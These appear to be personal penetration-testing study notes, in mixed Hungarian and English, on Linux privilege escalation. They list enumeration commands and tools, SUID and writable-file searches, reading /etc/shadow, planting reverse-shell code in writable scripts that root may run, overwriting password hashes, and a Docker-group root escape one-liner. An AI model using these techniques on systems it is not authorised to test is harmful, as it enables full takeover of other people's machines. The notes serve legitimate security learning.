# Linux privesc
## tactics 3
* sorrend
  * sudo -l, crontab -l, ps aux
  * ls /home, ls /root, ls /, cat /etc/passwd, cat /etc/shadow
  * linpeas, LinEnum
  * linux exploit suggester scriptek
## tactics 2
* lehet hogy eloszor egy masik user-hez kell privesc-elnunk pl a www-data user-rol
* es csak utana az ahhoz tartozo enumeration-nel tudunk majd tovabb menni a root-ra
## tactics
* search for files
  * search for suid bit files
  * search for processes that uncommon
  * search for writable and/or executable files
* if a file is writeable (write a rev shell code in it or put a bash command to it)
* if a file is modified by another file think how to put your own code in it
* if a file is using any user controlled data like 'env var', read from another file, etc... try to modify that data
* ha van valami writable sh script, akkor irjunk bele egy reverse shell kodot es allitsunk be hozza egy listenert
  * hatha a root lefuttatja random valamikor, nem tudhatjuk ugyebar.... mert nem latjuk hogy nala mit fut
  * probalkozzunk be
## basic things
* linux exploit suggester (github mznet)
  * ad linkeket
  * ha mazlink van akkor exploit_db-s linket ad es akkor ott lesz valami guide
  * ha nincs semmi guide akkor valszeg sima gcc-vel kell a .c fajlt leforditani es aztan chmod es lehet futtatni
* gyanus fajl valami nagyon jol lathato helyen, vagy ps-ben latjuk hogy fut a memoriaban
  * gyanus a neve, suid bites, valami root modban fut, vagy mas egyeb dolog van vele
  * lehet hogy ldd-vel ha megnezzuk akkor valahonnan behuz egy so fajlt
  * strings paranccsal is meg lehet nezni hogy milyen so fajlt huz be...
    * ha epp ott van benne es jol lathato
* keresni weak permission-os fajlt
  * find / -not -type l -perm -0+w
    * elvileg ami itt van azt szerkeszteni tudjuk
    * pl ha /etc/shadow itt van akkor az fasza mert ki tudjuk cserelni a hash-t valami masra
* meterpreter> post/multi/recon/local_exploit_suggester
* $ sudo -l
* linpeas.sh, LinEnum.sh
* google> "linux exploit suggester"
* google> "linux priv esc"
## searching folders with specified priv
* find / -writable -type d 2>/dev/null     # world-writeable folders
* find / -perm -222 -type d 2>/dev/null  # world-writeable folders
* find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
* find / -perm -o+x -type d 2>/dev/null    # world-executable folders
* find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
## SUID bit files
* find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
* find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
* find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  
* find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
* for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  
* find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  
* find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
## mit futtat le barki
### ps aux-al nem mindig latszik mert ha gyorsan eltunik, akkor hiaba nezzuk
### pspy !!!
* https://github.com/DominicBreuker/pspy
## docker group membership
* https://flast101.github.io/docker-privesc/
### info
* By default, any machine container is run with root privileges (ie. you have root privileges inside the container). It means that any user (by default, any member of the “docker” group) who has access to the Docker Daemon has root privileges in the container.
### steps
* a docker parancs egy GTFObin parancs
* https://gtfobins.github.io/gtfobins/docker
* docker run -v /:/mnt --rm -it alpine chroot /mnt sh
